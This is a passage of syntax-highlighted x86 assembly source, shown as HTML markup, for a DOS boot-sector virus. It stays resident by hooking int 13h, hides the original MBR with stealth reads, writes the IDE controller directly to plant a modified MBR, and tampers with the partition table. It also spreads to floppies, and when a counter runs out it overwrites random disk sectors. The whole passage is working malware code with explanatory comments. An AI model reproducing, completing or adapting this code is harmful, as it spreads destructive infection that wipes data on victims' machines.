                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">],</span><span class="sc2">300h</span><span class="sc0"> </span><span class="sc1">; new int18h handler is at</span><span class="sc0">
                                                </span><span class="sc1">; 0:300h</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">301h</span><span class="sc0">                 </span><span class="sc1">; write a sector from disk</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">sp</span><span class="sc0">                   </span><span class="sc1">; from es:sp</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">                    </span><span class="sc1">; points where the virus</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                    </span><span class="sc1">; resides on the hd</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">                  </span><span class="sc1">; is the hd?</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">not_from_hd</span><span class="sc0">

                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">7c20h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; payload counter</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">no_activation</span><span class="sc0">

</span><span class="sc5">payload</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">in</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">in</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                  </span><span class="sc1">; get random offset in BX</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                   </span><span class="sc1">; and random sector/cylinder</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">1fh</span><span class="sc0">                  </span><span class="sc1">; in CX</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">

                </span><span class="sc6">in</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                   </span><span class="sc1">; get random head in DH</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">0fh</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">304h</span><span class="sc0">                 </span><span class="sc1">; write 4 sectors</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">0ceh</span><span class="sc0">

                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">payload</span><span class="sc0">


</span><span class="sc5">no_activation</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">0ceh</span><span class="sc0">                    </span><span class="sc1">; rewrite the virus body</span><span class="sc0">
                                                </span><span class="sc1">; in its place (counter</span><span class="sc0">
                                                </span><span class="sc1">; decreased)</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">201h</span><span class="sc0">                 </span><span class="sc1">; read a sector</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                    </span><span class="sc1">; the MBR</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">013cdh</span><span class="sc0">                  </span><span class="sc1">; set an int13h on the</span><span class="sc0">
                                                </span><span class="sc1">; top of the stack</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc8">sp</span><span class="sc0">                      </span><span class="sc1">; execute the pushed int13.</span><span class="sc0">
                                                </span><span class="sc1">; this is reload the old</span><span class="sc0">
                                                </span><span class="sc1">; mbr (using stealth) and</span><span class="sc0">
                                                </span><span class="sc1">; then run it</span><span class="sc0">

</span><span class="sc5">not_from_hd</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">7c20h</span><span class="sc4">],</span><span class="sc2">78h</span><span class="sc0"> </span><span class="sc1">; initialize the payload cntr</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">                    </span><span class="sc1">; read one sector</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc2">7eh</span><span class="sc0">                  </span><span class="sc1">; to bx = 7E00h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                    </span><span class="sc1">; read the MBR</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">                  </span><span class="sc1">; from disk</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">0ceh</span><span class="sc0">                    </span><span class="sc1">; do the real int13h</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">1bfh</span><span class="sc4">+</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0"> </span><span class="sc1">; first partition starts at 1?</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">already_infected</span><span class="sc0">        </span><span class="sc1">; no, so probably infected or</span><span class="sc0">
                                                </span><span class="sc1">; infection may not be ok</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">302h</span><span class="sc0">                 </span><span class="sc1">; write two sectors</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc2">7ch</span><span class="sc0">                  </span><span class="sc1">; bx = 7c00h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">                    </span><span class="sc1">; save the virus body and</span><span class="sc0">
                                                </span><span class="sc1">; the original mbr starting</span><span class="sc0">
                                                </span><span class="sc1">; with sector 5</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">0ceh</span><span class="sc0">                    </span><span class="sc1">; do the real int13h</span><span class="sc0">


                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">7fbeh</span><span class="sc0">                </span><span class="sc1">; points to the original</span><span class="sc0">
                                                </span><span class="sc1">; partition table</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">7fceh</span><span class="sc0">                </span><span class="sc1">; where to save it</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">
                </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">                   </span><span class="sc1">; copy the partition table</span><span class="sc0">
                                                </span><span class="sc1">; 10h below the original</span><span class="sc0">
                                                </span><span class="sc1">; position</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">3bfh</span><span class="sc4">+</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc2">0500h</span><span class="sc0">
                                                </span><span class="sc1">; puts 05 as start of first</span><span class="sc0">
                                                </span><span class="sc1">; partition in partition tbl</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">7fceh</span><span class="sc0">                </span><span class="sc1">; modify the partition table</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                   </span><span class="sc1">; so it will be quite hard to</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">                           </span><span class="sc1">; boot without the virus in</span><span class="sc0">
                                                </span><span class="sc1">; in memory :)</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">                           </span><span class="sc1">; do virus second "partition"</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ide_prog</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">7c00h</span><span class="sc4">)</span><span class="sc0">
                                                </span><span class="sc1">; point to the init sequence</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">1f0h</span><span class="sc0">                 </span><span class="sc1">; starting port - 1</span><span class="sc0">


</span><span class="sc1">; now the virus will initialize the controller, set the write mode etc...</span><span class="sc0">
</span><span class="sc1">; look at the ide_prog label for the details!</span><span class="sc0">

</span><span class="sc5">program_ide</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">                      </span><span class="sc1">; increase port</span><span class="sc0">
                </span><span class="sc6">outsb</span><span class="sc0">                           </span><span class="sc1">; write DS:SI to port DX</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">program_ide</span><span class="sc0">


</span><span class="sc5">wait_loop</span><span class="sc4">:</span><span class="sc0">                                      </span><span class="sc1">; wait a little for the ide</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">wait_loop</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">7e00h</span><span class="sc0">                </span><span class="sc1">; point to the 'new' MBR</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                    </span><span class="sc1">; copy 200h bytes</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">0f0h</span><span class="sc0">                 </span><span class="sc1">; to port 1f0h</span><span class="sc0">
                </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">outsw</span><span class="sc0">                   </span><span class="sc1">; write the modified MBR</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">7fceh</span><span class="sc0">                </span><span class="sc1">; modify also the second</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">7fbeh</span><span class="sc0">                </span><span class="sc1">; saved MBR that will be of</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">                  </span><span class="sc1">; use to confuse dos at a</span><span class="sc0">
                </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">                   </span><span class="sc1">; boot from a clean floppy</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">30h</span><span class="sc0">                  </span><span class="sc1">; delete the a second entry</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                    </span><span class="sc1">; from partition table</span><span class="sc0">
                </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">stosb</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">301h</span><span class="sc0">                 </span><span class="sc1">; write the second mbr to hd</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc2">7eh</span><span class="sc0">                  </span><span class="sc1">; bx to the modified mbr</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">0ceh</span><span class="sc0">                    </span><span class="sc1">; do the real int13h</span><span class="sc0">

</span><span class="sc5">already_infected</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">19h</span><span class="sc0">                     </span><span class="sc1">; reboot</span><span class="sc0">


</span><span class="sc1">; From this point the virus will be copied to 0:300h in memory and will stay</span><span class="sc0">
</span><span class="sc1">; always there...</span><span class="sc0">

</span><span class="sc5">int18_handler</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc0">                    </span><span class="sc1">; correct stack since the</span><span class="sc0">
                                                </span><span class="sc1">; virus uses 18_tech</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">                    </span><span class="sc1">; reading?</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">leave_call</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">                    </span><span class="sc1">; writing?</span><span class="sc0">
                </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">leave_call</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                    </span><span class="sc1">; on boot/mbr ?</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">leave_call</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">                  </span><span class="sc1">; on floppy or hd?</span><span class="sc0">
                </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">leave_call</span><span class="sc0">

                </span><span class="sc6">pusha</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">302h</span><span class="sc0">                 </span><span class="sc1">; save 1024 bytes from</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc0">                    </span><span class="sc1">; the buffer ES:BX on a</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">                  </span><span class="sc1">; buffer on the HD</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">13h</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">201h</span><span class="sc0">                 </span><span class="sc1">; read the entire virus</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">                    </span><span class="sc1">; from the HD to ES:BX</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">13h</span><span class="sc0">

                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">infect_ste</span><span class="sc0">    </span><span class="sc1">; jump to the infection</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">                      </span><span class="sc1">; routine (we just readed</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">                      </span><span class="sc1">; it from the disk)</span><span class="sc0">
                </span><span class="sc6">retf</span><span class="sc0">

</span><span class="sc5">returning</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">13h</span><span class="sc0">

                </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">popf</span><span class="sc0">                </span><span class="sc1">; Pop flags</span><span class="sc0">
        </span><span class="sc6">retf</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0">           </span><span class="sc1">; Return far</span><span class="sc0">
</span><span class="sc5">leave_call</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0eah</span><span class="sc0">
</span><span class="sc5">orig_int13</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">       </span><span class="sc2">00h</span><span class="sc0">                    </span><span class="sc1">; original seg:off of int13h</span><span class="sc0">
                                                </span><span class="sc1">; int CEh will point on this</span><span class="sc0">
                                                </span><span class="sc1">; doubleword</span><span class="sc0">

</span><span class="sc1">; here is the end of the part of the virus that is always in memory (starting</span><span class="sc0">
</span><span class="sc1">; from 0:300h up to 0:33Ch)</span><span class="sc0">

                </span><span class="sc9">org</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">                     </span><span class="sc1">; The next four bytes (as</span><span class="sc0">
                                                </span><span class="sc1">; you notice by the org :) )</span><span class="sc0">
                                                </span><span class="sc1">; are overwritten in memory</span><span class="sc0">
                                                </span><span class="sc1">; by the int13h seg:off, but</span><span class="sc0">
                                                </span><span class="sc1">; are always present on the</span><span class="sc0">
                                                </span><span class="sc1">; disk. Infact the infection</span><span class="sc0">
                                                </span><span class="sc1">; routine is present in mem</span><span class="sc0">
                                                </span><span class="sc1">; just when needed...</span><span class="sc0">
</span><span class="sc5">infect_ste</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">popa</span><span class="sc0">                            </span><span class="sc1">; reload calling regs</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">                  </span><span class="sc1">; is on the HD ?</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">floppy_disk</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">                  </span><span class="sc1">; writing on the MBR ??? :)</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">you_wont</span><span class="sc0">

                </span><span class="sc6">pusha</span><span class="sc0">                           </span><span class="sc1">; it seems they are going</span><span class="sc0">
                                                </span><span class="sc1">; to read it...</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc0">                    </span><span class="sc1">; read the saved one from HD</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">13h</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">301h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc0">                    </span><span class="sc1">; save it on our disk buffer</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">13h</span><span class="sc0">

                </span><span class="sc6">popa</span><span class="sc0">

</span><span class="sc5">you_wont</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">clc</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                   </span><span class="sc1">; zero AX</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">exit_infect</span><span class="sc0">

</span><span class="sc5">floppy_disk</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">                    </span><span class="sc1">; are they reading?</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">reading_it</span><span class="sc0">

                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">0ceh</span><span class="sc0">                    </span><span class="sc1">; well, leave the sucker</span><span class="sc0">
                                                </span><span class="sc1">; to write and exit</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">exit_infect</span><span class="sc0">

</span><span class="sc5">reading_it</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">                    </span><span class="sc1">; read it in our mem buffer</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">0ceh</span><span class="sc0">                    </span><span class="sc1">; (this is ES:[BX+200h])</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">

                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">exit_infect</span><span class="sc0">             </span><span class="sc1">; exit on error</span><span class="sc0">

                </span><span class="sc6">cld</span><span class="sc0">
                </span><span class="sc6">pusha</span><span class="sc0">

                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">0227h</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; point to the serial num</span><span class="sc0">
                </span><span class="sc5">lea_ok</span><span class="sc0">  </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc0"> </span><span class="sc2">027h</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; point to the dest serial num</span><span class="sc0">

                </span><span class="sc5">segcs</span><span class="sc0">   </span><span class="sc6">movsd</span><span class="sc0">                   </span><span class="sc1">; copy the serial number</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">220h</span><span class="sc4">+</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">; this place is usually at</span><span class="sc0">
                                                </span><span class="sc1">; floppy formatation 00h, so</span><span class="sc0">
                                                </span><span class="sc1">; if it != 00h then maybe it</span><span class="sc0">
                                                </span><span class="sc1">; is already infected and it</span><span class="sc0">
                                                </span><span class="sc1">; may contain a payload cntr</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">no_bonus</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">301h</span><span class="sc0">                 </span><span class="sc1">; write virus to floppy disk</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">0CEh</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">no_bonus</span><span class="sc0">                </span><span class="sc1">; error? if so no bonus!</span><span class="sc0">

                </span><span class="sc5">add_l</span><span class="sc0">   </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc0"> </span><span class="sc4">],</span><span class="sc2">02h</span><span class="sc0"> </span><span class="sc1">; add 2 to our payload counter</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">301h</span><span class="sc0">                 </span><span class="sc1">; rewrite the virus body</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">                    </span><span class="sc1">; to its usual place, but</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">                  </span><span class="sc1">; with the different counter</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">13h</span><span class="sc0">

</span><span class="sc5">no_bonus</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">201h</span><span class="sc0">                 </span><span class="sc1">; read the dos boot sector</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">                    </span><span class="sc1">; that is very probably</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                    </span><span class="sc1">; here. this is a good</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">180h</span><span class="sc0">                 </span><span class="sc1">; "normal" boot sector</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">13h</span><span class="sc0">

                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">+</span><span class="sc2">03h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; point to our space for</span><span class="sc0">
                                                </span><span class="sc1">; the bpb</span><span class="sc0">
                </span><span class="sc5">lea_ok</span><span class="sc0">  </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc0"> </span><span class="sc2">03h</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; point to the dos boot</span><span class="sc0">
                                                </span><span class="sc1">; space of the bpb</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">3bh</span><span class="sc0">                  </span><span class="sc1">; how many bytes we need</span><span class="sc0">

                </span><span class="sc5">segcs</span><span class="sc0">   </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">               </span><span class="sc1">; move our (floppy) bpb to</span><span class="sc0">
                                                </span><span class="sc1">; it's place.</span><span class="sc0">

